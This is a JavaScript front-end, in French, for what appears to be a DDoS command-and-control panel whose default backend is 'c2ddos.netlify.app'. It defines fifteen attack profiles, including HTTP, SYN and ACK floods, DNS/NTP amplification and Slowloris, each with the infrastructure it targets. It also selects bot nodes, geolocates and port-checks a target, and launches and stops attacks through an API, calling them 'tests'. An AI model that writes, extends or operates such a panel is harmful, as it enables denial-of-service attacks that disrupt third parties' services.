const DEFAULT_API_BASE = 'https://c2ddos.netlify.app/api';
const API_BASE_URL = window.__API_BASE_URL__ || localStorage.getItem('nexus-api-base-url') || (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:5000/api'
  : DEFAULT_API_BASE);
const WS_BASE_URL = window.__WS_BASE_URL__ || localStorage.getItem('nexus-ws-base-url') || (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'ws://localhost:5000/ws'
  : `${API_BASE_URL.replace(/^http/, 'ws').replace(/^https/, 'wss').replace(/\/api$/, '')}/ws`);
const API_TOKEN = localStorage.getItem('nexus-api-token') || 'nexus-demo-token';

const statusBadge = document.getElementById('status-badge');
const connectionCount = document.getElementById('active-connections');
const packetsCount = document.getElementById('packets-sent');
const responseTime = document.getElementById('response-time');
const successRateEl = document.getElementById('success-rate');
const agentsContainer = document.getElementById('agents-list');
const logContainer = document.getElementById('log-list');
const testsListEl = document.getElementById('tests-list');
const form = document.getElementById('control-form');
const chartCanvas = document.getElementById('traffic-chart');
const ctx = chartCanvas.getContext('2d');
const matrixCanvas = document.getElementById('matrix-canvas');
const matrixCtx = matrixCanvas.getContext('2d');
const selectedCountEl = document.getElementById('selected-count');
const selectAllButton = document.getElementById('select-all');
const targetInput = document.getElementById('target');
const geoCaption = document.getElementById('geo-caption');
const attackProfilesEl = document.getElementById('attack-profiles');
const attackSummaryEl = document.getElementById('attack-summary');
const targetStateEl = document.getElementById('target-state');
const vectorInput = document.getElementById('vector');
const portInput = document.getElementById('target-port');
const threadsInput = document.getElementById('threads');
const durationInput = document.getElementById('duration');
const matrixState = {
  drops: [],
  animationFrame: null
};

const attackProfiles = [
  {
    id: 'http-flood',
    label: 'HTTP Flood',
    vector: 'HTTP GET/POST Flood',
    port: 80,
    duration: 60,
    threads: 20,
    mode: 'Standard',
    description: 'Sature le service web sur les endpoints HTTP.',
    effect: 'À toucher : front-end web, reverse proxy, CDN, pondération de trafic.',
    targets: 'Serveurs HTTP / applications web'
  },
  {
    id: 'http-post-burst',
    label: 'HTTP POST Burst',
    vector: 'HTTP POST Burst',
    port: 80,
    duration: 45,
    threads: 24,
    mode: 'Équilibré',
    description: 'Concentre les requêtes POST sur les formulaires et API.',
    effect: 'À toucher : API applicatives, traitements POST, backends de logique.',
    targets: 'Applications web / API métier'
  },
  {
    id: 'https-flood',
    label: 'HTTPS Flood',
    vector: 'HTTP GET/POST Flood',
    port: 443,
    duration: 90,
    threads: 24,
    mode: 'TLS',
    description: 'Exerce une pression TLS sur le service HTTPS.',
    effect: 'À toucher : terminaux TLS, load balancers, certificats et sockets chiffrés.',
    targets: 'Endpoints HTTPS / API sécurisées'
  },
  {
    id: 'http-keepalive',
    label: 'HTTP Keep-Alive',
    vector: 'HTTP Keep-Alive Flood',
    port: 80,
    duration: 75,
    threads: 18,
    mode: 'Connexions',
    description: 'Maintient des connexions ouvertes pour saturer les workers.',
    effect: 'À toucher : pools de sockets, backends, files de traitement HTTP.',
    targets: 'Serveurs web / reverse proxies'
  },
  {
    id: 'tcp-syn',
    label: 'TCP SYN Flood',
    vector: 'TCP SYN Flood',
    port: 80,
    duration: 75,
    threads: 32,
    mode: 'Réseau',
    description: 'Remplit la file d’attente de connexion TCP.',
    effect: 'À toucher : piles TCP, firewall, file d’attente d’acceptation.',
    targets: 'Infrastructure réseau / services TCP'
  },
  {
    id: 'tcp-ack',
    label: 'TCP ACK Flood',
    vector: 'TCP ACK Flood',
    port: 80,
    duration: 80,
    threads: 28,
    mode: 'Réseau',
    description: 'Inonde la pile TCP avec des ACK et des segments de contrôle.',
    effect: 'À toucher : routeurs, pare-feux, seuils de session TCP.',
    targets: 'Équipements réseau / filtrage'
  },
  {
    id: 'tcp-rst',
    label: 'TCP RST Flood',
    vector: 'TCP RST Flood',
    port: 80,
    duration: 60,
    threads: 26,
    mode: 'Réseau',
    description: 'Perturbe les établissements de session TCP en masse.',
    effect: 'À toucher : sessions TCP établies, stabilité des connexions existantes.',
    targets: 'Services TCP / flux actifs'
  },
  {
    id: 'udp-dns',
    label: 'UDP DNS Reflection',
    vector: 'UDP Amplification (DNS, NTP)',
    port: 53,
    duration: 120,
    threads: 18,
    mode: 'Amplification',
    description: 'Oriente le trafic UDP vers les services DNS.',
    effect: 'À toucher : DNS, résolveurs, circuits de transit et saturation de bande.',
    targets: 'DNS / services UDP / relais'
  },
  {
    id: 'udp-ntp',
    label: 'UDP NTP Amplification',
    vector: 'UDP Amplification (DNS, NTP)',
    port: 123,
    duration: 110,
    threads: 16,
    mode: 'Amplification',
    description: 'Exploite la réflexion UDP vers les services NTP.',
    effect: 'À toucher : services de temps, saturation de liaisons et trafic amplifié.',
    targets: 'NTP / services UDP / transit'
  },
  {
    id: 'udp-frag',
    label: 'UDP Fragmentation',
    vector: 'UDP Fragmentation Flood',
    port: 53,
    duration: 100,
    threads: 22,
    mode: 'Volumétrique',
    description: 'Génère des fragments UDP pour saturer la reconstruction.',
    effect: 'À toucher : inspection réseau, fragments, MTU et traitement de paquets.',
    targets: 'Pare-feux / routeurs / inspecteurs'
  },
  {
    id: 'slowloris',
    label: 'Slowloris',
    vector: 'Slowloris',
    port: 80,
    duration: 90,
    threads: 16,
    mode: 'Connexion',
    description: 'Maintient des connexions ouvertes pour monopoliser les workers.',
    effect: 'À toucher : workers de serveur, sockets persistants et pool de connexions.',
    targets: 'Serveurs web / API lentes'
  },
  {
    id: 'tls-handshake',
    label: 'TLS Handshake Flood',
    vector: 'HTTP GET/POST Flood',
    port: 443,
    duration: 105,
    threads: 30,
    mode: 'TLS',
    description: 'Produit de nombreux handshakes TLS pour saturer les terminaux.',
    effect: 'À toucher : couches TLS, certificats, CPU de chiffrement et sessions.',
    targets: 'Ingress TLS / API privées'
  },
  {
    id: 'dns-nxdomain',
    label: 'DNS NXDOMAIN Flood',
    vector: 'UDP Amplification (DNS, NTP)',
    port: 53,
    duration: 95,
    threads: 20,
    mode: 'DNS',
    description: 'Surcharge la résolution DNS avec des requêtes invalides.',
    effect: 'À toucher : moteurs de résolution, caches DNS et services internes.',
    targets: 'Serveurs DNS / résolveurs'
  },
  {
    id: 'conn-exhaustion',
    label: 'Connection Exhaustion',
    vector: 'HTTP Keep-Alive Flood',
    port: 80,
    duration: 85,
    threads: 34,
    mode: 'Massif',
    description: 'Épuise le pool de connexions et les workers côté service.',
    effect: 'À toucher : pool de connexions, workers, file d’attente et latence.',
    targets: 'Applications / load balancers'
  },
  {
    id: 'http-range',
    label: 'HTTP Range Flood',
    vector: 'HTTP GET/POST Flood',
    port: 80,
    duration: 70,
    threads: 21,
    mode: 'Volumétrique',
    description: 'Multiplier les requêtes de plage sur les objets statiques.',
    effect: 'À toucher : stockage objet, bande passante, caches CDN et réponses volumineuses.',
    targets: 'CDN / stockage / objets statiques'
  }
];

const state = {
  status: 'ONLINE',
  apiBaseUrl: API_BASE_URL,
  activeConnections: 0,
  packetsSent: 0,
  avgResponseTime: 0,
  successRate: 100,
  trafficHistory: [],
  logs: [],
  agents: [],
  tests: [],
  currentTest: null,
  geoip: null,
  map: null,
  marker: null,
  socket: null,
  selectedProfileId: 'http-flood'
};

function resizeMatrix() {
  const ratio = window.devicePixelRatio || 1;
  matrixCanvas.width = window.innerWidth * ratio;
  matrixCanvas.height = window.innerHeight * ratio;
  matrixCtx.setTransform(ratio, 0, 0, ratio, 0, 0);
  const columns = Math.max(40, Math.floor(window.innerWidth / 14));
  matrixState.drops = Array.from({ length: columns }, () => ({
    x: Math.random() * window.innerWidth,
    y: Math.random() * window.innerHeight,
    speed: 10 + Math.random() * 18,
    length: 8 + Math.random() * 20,
    color: ['#ff4d4d'][Math.floor(Math.random() * 3)]
  }));
}

function drawMatrixBackground() {
  const width = window.innerWidth;
  const height = window.innerHeight;
  matrixCtx.fillStyle = 'rgba(2, 6, 12, 0.26)';
  matrixCtx.fillRect(0, 0, width, height);

  if (matrixState.drops.length === 0 || matrixState.drops.length !== Math.max(40, Math.floor(width / 14))) {
    resizeMatrix();
  }

  matrixState.drops.forEach((drop) => {
    drop.y += drop.speed * (0.8 + Math.random() * 0.35);
    if (drop.y > height + drop.length * 10) {
      drop.y = -drop.length * 8;
      drop.x = Math.random() * width;
      drop.speed = 10 + Math.random() * 18;
      drop.color = ['#ff4d4d'][Math.floor(Math.random() * 2)];
    }

    const trail = Math.max(0.15, 0.35 + Math.random() * 0.2);
    matrixCtx.font = `${drop.length + 4}px Share Tech Mono`;
    matrixCtx.fillStyle = `rgba(255, 255, 255, ${trail})`;
    matrixCtx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), drop.x + 1, drop.y - 8);
    matrixCtx.fillStyle = drop.color;
    matrixCtx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), drop.x, drop.y);
  });

  matrixState.animationFrame = window.requestAnimationFrame(drawMatrixBackground);
}

function updateStatus() {
  const label = state.status === 'ONLINE' ? 'SYSTÈME EN LIGNE' : state.status === 'WARNING' ? 'ATTENTION' : 'SYSTÈME HORS LIGNE';
  statusBadge.textContent = label;
  statusBadge.className = `status-pill ${state.status.toLowerCase()}`;
}

function pushLog(message) {
  const now = new Date();
  const time = now.toLocaleTimeString('fr-FR', { hour12: false });
  state.logs.push(`[${time}] ${message}`);
  if (state.logs.length > 40) state.logs.shift();
  renderLogs();
}

function updateSelectedCount() {
  const total = state.agents.length;
  const selected = state.agents.filter((agent) => agent.selected).length;
  selectedCountEl.textContent = `Nœuds sélectionnés : ${selected} / ${total}`;
}

function renderAgents() {
  updateSelectedCount();
  agentsContainer.innerHTML = '';
  if (!state.agents.length) {
    const emptyState = document.createElement('div');
    emptyState.className = 'session-card';
    emptyState.innerHTML = '<div class="session-meta">Aucun nœud disponible tant qu’aucun test n’est lancé.</div>';
    agentsContainer.appendChild(emptyState);
    return;
  }

  state.agents.forEach((agent) => {
    const card = document.createElement('div');
    card.className = 'agent-card';
    card.innerHTML = `
      <div class="agent-meta">
        <strong>${agent.id}</strong>
        <span>${agent.ip}</span>
      </div>
      <div class="agent-actions">
        <input type="checkbox" class="agent-checkbox" data-id="${agent.id}" ${agent.selected ? 'checked' : ''} />
        <span class="badge ${agent.status.toLowerCase()}">${agent.status}</span>
      </div>
      <div class="agent-meta">
        <strong>LOAD: ${agent.load}%</strong>
        <span>Telemetry node</span>
      </div>
    `;
    const checkbox = card.querySelector('.agent-checkbox');
    checkbox.addEventListener('change', (event) => {
      const current = state.agents.find((entry) => entry.id === agent.id);
      if (current) {
        current.selected = event.target.checked;
        updateSelectedCount();
      }
    });
    agentsContainer.appendChild(card);
  });
}

function renderAttackProfiles() {
  attackProfilesEl.innerHTML = '';
  attackProfiles.forEach((profile) => {
    const card = document.createElement('button');
    card.type = 'button';
    card.className = `attack-card ${state.selectedProfileId === profile.id ? 'active' : ''}`;
    card.innerHTML = `
      <strong>${profile.label}</strong>
      <span>${profile.description}</span>
      <small>Mode ${profile.mode} • Port ${profile.port} • ${profile.duration}s</small>
    `;
    card.addEventListener('click', () => applyProfile(profile.id));
    attackProfilesEl.appendChild(card);
  });
}

function applyProfile(profileId) {
  const profile = attackProfiles.find((item) => item.id === profileId);
  if (!profile) {
    return;
  }

  state.selectedProfileId = profile.id;
  vectorInput.value = profile.vector;
  portInput.value = profile.port;
  durationInput.value = profile.duration;
  threadsInput.value = profile.threads;
  attackSummaryEl.innerHTML = `
    <strong>${profile.label}</strong>
    <div>Mode : ${profile.mode}</div>
    <div>${profile.effect}</div>
    <div>${profile.targets}</div>
  `;
  renderAttackProfiles();
  refreshTargetState(targetInput.value);
}

function renderMetrics() {
  const activeTest = state.currentTest || state.tests.find((item) => item.status === 'RUNNING');
  const source = activeTest?.metrics || null;

  if (!source) {
    connectionCount.textContent = '—';
    packetsCount.textContent = '—';
    responseTime.textContent = '—';
    successRateEl.textContent = '—';
    return;
  }

  connectionCount.textContent = source.activeConnections.toString();
  packetsCount.textContent = source.packetsSent.toLocaleString();
  responseTime.textContent = `${source.avgResponseTime} ms`;
  successRateEl.textContent = `${source.successRate.toFixed(1)}%`;
}

function renderLogs() {
  logContainer.innerHTML = '';
  if (!state.logs.length) {
    const item = document.createElement('div');
    item.className = 'log-entry';
    item.textContent = 'Aucune activité à afficher avant le lancement d’un test.';
    logContainer.appendChild(item);
    return;
  }

  state.logs.slice(-12).forEach((entry) => {
    const item = document.createElement('div');
    item.className = 'log-entry';
    const time = entry.match(/\[(.*?)\]/)?.[1] || '00:00:00';
    item.innerHTML = `<span class="time">${time}</span>${entry.replace(/^\[[^\]]+\]\s*/, '')}`;
    logContainer.appendChild(item);
  });
}

function renderHistory() {
  testsListEl.innerHTML = '';
  const recentTests = state.tests.slice(0, 6);
  if (!recentTests.length) {
    testsListEl.innerHTML = '<div class="session-card"><div class="session-meta">Aucune session de test enregistrée pour le moment.</div></div>';
    return;
  }

  const fragment = document.createDocumentFragment();
  recentTests.forEach((test) => {
    const card = document.createElement('div');
    card.className = 'session-card';
    const badgeClass = test.status?.toLowerCase() || 'completed';
    card.innerHTML = `
      <div class="session-head">
        <strong>${test.id}</strong>
        <span class="session-badge ${badgeClass}">${test.status || 'COMPLETED'}</span>
      </div>
      <div class="session-meta">Cible : ${test.target} • Port : ${test.port || 80}</div>
      <div class="session-meta">Type : ${test.method || 'HTTP'} • Durée : ${test.duration || 0}s</div>
      <div class="session-meta">Connexions : ${test.metrics?.activeConnections || 0} • Réussite : ${test.metrics?.successRate || 0}%</div>
    `;
    fragment.appendChild(card);
  });
  testsListEl.appendChild(fragment);
}

function renderChart() {
  const width = chartCanvas.width;
  const height = chartCanvas.height;
  ctx.clearRect(0, 0, width, height);
  ctx.strokeStyle = 'rgba(255, 77, 77, 0.45)';
  ctx.lineWidth = 1;
  ctx.beginPath();
  ctx.moveTo(0, height / 2);
  ctx.lineTo(width, height / 2);
  ctx.stroke();

  if (!state.trafficHistory.length) {
    ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
    ctx.font = '14px Share Tech Mono';
    ctx.fillText('Aucune donnée tant qu’aucun test n’est actif.', 18, 24);
    return;
  }

  ctx.strokeStyle = '#ff6b6b';
  ctx.lineWidth = 2;
  ctx.beginPath();
  state.trafficHistory.forEach((value, index) => {
    const x = (index / (state.trafficHistory.length - 1)) * width;
    const y = height - (value / 60) * height;
    if (index === 0) {
      ctx.moveTo(x, y);
    } else {
      ctx.lineTo(x, y);
    }
  });
  ctx.stroke();
}

function initMap() {
  if (state.map) {
    return;
  }

  state.map = L.map('geo-map', {
    zoomControl: false,
    attributionControl: false
  }).setView([20, 0], 2);

  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 6
  }).addTo(state.map);

  state.marker = L.marker([0, 0], {
    icon: L.divIcon({
      html: '<div class="pulse-marker"></div>',
      className: 'pulse-icon',
      iconSize: [16, 16]
    })
  }).addTo(state.map);
}

function updateMapGeo(location) {
  initMap();
  if (!location || Number.isNaN(location.lat) || Number.isNaN(location.lon)) {
    geoCaption.textContent = location?.note || 'Impossible de déterminer la localisation publique de cette cible.';
    return;
  }

  const lat = Number(location.lat);
  const lon = Number(location.lon);
  state.marker.setLatLng([lat, lon]);
  state.map.setView([lat, lon], 4);
  state.marker.bindTooltip(`IP: ${location.query || 'unknown'} | Country: ${location.country || 'unknown'} | City: ${location.city || 'unknown'} | ISP: ${location.isp || 'unknown'}`);
  geoCaption.textContent = `${location.city || 'Unknown'} • ${location.country || 'Unknown'} • ${location.isp || 'Unknown'}`;
}

async function requestJson(path, options = {}) {
  try {
    const response = await fetch(`${state.apiBaseUrl}${path}`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${API_TOKEN}`
      },
      ...options
    });
    if (!response.ok) {
      const error = await response.json().catch(() => ({ error: 'Request failed' }));
      throw new Error(error.error || `HTTP ${response.status}`);
    }
    return response.json();
  } catch (error) {
    pushLog(`Erreur API sur ${path} : ${error.message}`);
    throw error;
  }
}

async function refreshGeoLocation(target) {
  if (!target) {
    return;
  }
  try {
    const geo = await requestJson(`/geoip/${encodeURIComponent(target)}`);
    state.geoip = geo;
    updateMapGeo(geo);
  } catch (error) {
    pushLog(`Échec de la géolocalisation : ${error.message}`);
  }
}

async function refreshTargetState(target) {
  const port = Number(portInput.value || 80);
  if (!target) {
    targetStateEl.innerHTML = '<div class="target-state-item"><span>État cible</span><strong>Entrez une cible pour obtenir sa synthèse.</strong></div>';
    return;
  }

  try {
    const response = await requestJson(`/target-state/${encodeURIComponent(target)}?port=${port}`);
    const geoLine = response.geo?.city && response.geo?.country
      ? `${response.geo.city} • ${response.geo.country}`
      : 'Localisation non disponible';
    const portState = response.portState?.open ? 'Port ouvert' : 'Port fermé ou filtré';
    const connectionsLine = response.activeConnections > 0
      ? `${response.activeConnections} connexions actives observées`
      : 'Aucune connexion observée pour l’instant';

    targetStateEl.innerHTML = `
      <div class="target-state-item">
        <span>Adresse résolue</span>
        <strong>${response.resolvedIp || 'inconnue'}</strong>
      </div>
      <div class="target-state-item">
        <span>Réseau</span>
        <strong>${response.private ? 'Réseau privé / réservé' : 'Réseau public'}</strong>
      </div>
      <div class="target-state-item">
        <span>Localisation</span>
        <strong>${geoLine}</strong>
      </div>
      <div class="target-state-item">
        <span>Port ciblé</span>
        <strong>${portState} • ${response.port}</strong>
      </div>
      <div class="target-state-item">
        <span>Connexions</span>
        <strong>${connectionsLine}</strong>
      </div>
    `;
  } catch (error) {
    targetStateEl.innerHTML = `<div class="target-state-item"><span>État cible</span><strong>Impossible d’obtenir l’état : ${error.message}</strong></div>`;
  }
}

async function refreshNodes() {
  try {
    const response = await requestJson('/nodes');
    const incoming = response.nodes || [];
    const previousSelection = new Set(state.agents.filter((agent) => agent.selected).map((agent) => agent.id));
    state.agents = incoming.map((agent) => ({
      ...agent,
      selected: previousSelection.has(agent.id) || agent.selected || false
    }));
    renderAgents();
  } catch (error) {
    pushLog(`Échec du rafraîchissement des nœuds : ${error.message}`);
  }
}

async function refreshTests() {
  try {
    const response = await requestJson('/tests');
    const tests = response.tests || [];
    state.tests = tests;
    const activeTest = tests.find((item) => item.status === 'RUNNING') || tests[0] || state.currentTest;
    if (activeTest && activeTest.metrics) {
      state.currentTest = activeTest;
      state.activeConnections = activeTest.metrics?.activeConnections || state.activeConnections;
      state.packetsSent = activeTest.metrics?.packetsSent || state.packetsSent;
      state.avgResponseTime = activeTest.metrics?.avgResponseTime || state.avgResponseTime;
      state.successRate = activeTest.metrics?.successRate || state.successRate;
      state.trafficHistory.push(activeTest.metrics?.packetsSent ? Math.min(60, Math.round(activeTest.metrics.packetsSent / 40)) : 30);
      state.trafficHistory.shift();
      renderMetrics();
      renderChart();
      return;
    }

    state.currentTest = null;
    state.activeConnections = 0;
    state.packetsSent = 0;
    state.avgResponseTime = 0;
    state.successRate = 100;
    state.trafficHistory = [];
    renderMetrics();
    renderChart();
  } catch (error) {
    pushLog(`Échec du rafraîchissement des tests : ${error.message}`);
  }
}

function connectSocket() {
  const socketUrl = WS_BASE_URL;

  try {
    state.socket = new WebSocket(socketUrl);
    state.socket.addEventListener('message', (event) => {
      const payload = JSON.parse(event.data);
      if (payload.type === 'metrics') {
        const test = payload.payload;
        state.currentTest = test;
        state.tests = [test, ...state.tests.filter((item) => item.id !== test.id)];
        state.activeConnections = test.metrics?.activeConnections || state.activeConnections;
        state.packetsSent = test.metrics?.packetsSent || state.packetsSent;
        state.avgResponseTime = test.metrics?.avgResponseTime || state.avgResponseTime;
        state.successRate = test.metrics?.successRate || state.successRate;
        state.trafficHistory.push(Math.min(60, Math.round(test.metrics?.packetsSent / 40) || 20));
        state.trafficHistory.shift();
        renderMetrics();
        renderChart();
      }
      if (payload.type === 'log') {
        pushLog(payload.payload);
      }
    });
  } catch (error) {
    pushLog(`WebSocket indisponible : ${error.message}`);
  }
}

async function deployPayload(event) {
  event.preventDefault();
  const formData = new FormData(form);
  const target = String(formData.get('target') || '').trim();
  const vector = String(formData.get('vector') || 'HTTP GET/POST Flood');
  const port = Number(formData.get('target-port') || 80);
  const threads = Number(formData.get('threads') || 20);
  const duration = Number(formData.get('duration') || 60);

  if (!target) {
    pushLog('Déploiement annulé : cible absente.');
    return;
  }

  state.status = 'WARNING';
  updateStatus();
  pushLog(`Déploiement de ${vector.toLowerCase()} vers ${target}:${port} avec ${threads} connexions.`);

  try {
    await refreshTargetState(target);
    const response = await requestJson('/test/start', {
      method: 'POST',
      body: JSON.stringify({ target, method: vector, threads, duration, port })
    });
    if (response?.test) {
      state.currentTest = response.test;
      state.tests.unshift(response.test);
      state.activeConnections = response.test.metrics?.activeConnections || threads;
      state.packetsSent = response.test.metrics?.packetsSent || state.packetsSent;
      state.avgResponseTime = response.test.metrics?.avgResponseTime || state.avgResponseTime;
      state.successRate = response.test.metrics?.successRate || state.successRate;
      renderMetrics();
      renderChart();
      pushLog(`Test ${response.test.id} lancé. Surveillance active.`);
      await refreshGeoLocation(target);
    }
  } catch (error) {
    pushLog(`Échec du déploiement : ${error.message}`);
  }
}

async function abortOperations() {
  if (!state.currentTest) {
    pushLog('Arrêt demandé mais aucun test actif n’est enregistré.');
    return;
  }

  try {
    await requestJson(`/test/${state.currentTest.id}/stop`, { method: 'POST' });
    pushLog(`Test ${state.currentTest.id} marqué comme arrêté.`);
    state.status = 'ONLINE';
    updateStatus();
    state.currentTest = null;
    renderMetrics();
  } catch (error) {
    pushLog(`Échec de l’arrêt : ${error.message}`);
  }
}

selectAllButton.addEventListener('click', () => {
  const shouldSelect = state.agents.some((agent) => !agent.selected);
  state.agents.forEach((agent) => {
    agent.selected = shouldSelect;
  });
  renderAgents();
  pushLog(`Sélection mise à jour pour ${state.agents.length} nœuds.`);
});

form.addEventListener('submit', deployPayload);
const abortButton = document.getElementById('abort-button');
abortButton.addEventListener('click', abortOperations);
targetInput.addEventListener('blur', () => {
  refreshGeoLocation(targetInput.value);
  refreshTargetState(targetInput.value);
});
[portInput, threadsInput, durationInput].forEach((input) => {
  input.addEventListener('change', () => refreshTargetState(targetInput.value));
});

resizeMatrix();
window.addEventListener('resize', resizeMatrix);
if (matrixState.animationFrame) {
  cancelAnimationFrame(matrixState.animationFrame);
}
matrixState.animationFrame = window.requestAnimationFrame(drawMatrixBackground);
setInterval(() => {
  refreshNodes();
  refreshTests();
}, 5000);

renderAttackProfiles();
applyProfile(state.selectedProfileId);
renderAgents();
renderMetrics();
renderLogs();
renderHistory();
renderChart();
updateStatus();
connectSocket();
refreshGeoLocation(targetInput.value);
refreshTargetState(targetInput.value);
refreshNodes();
refreshTests();
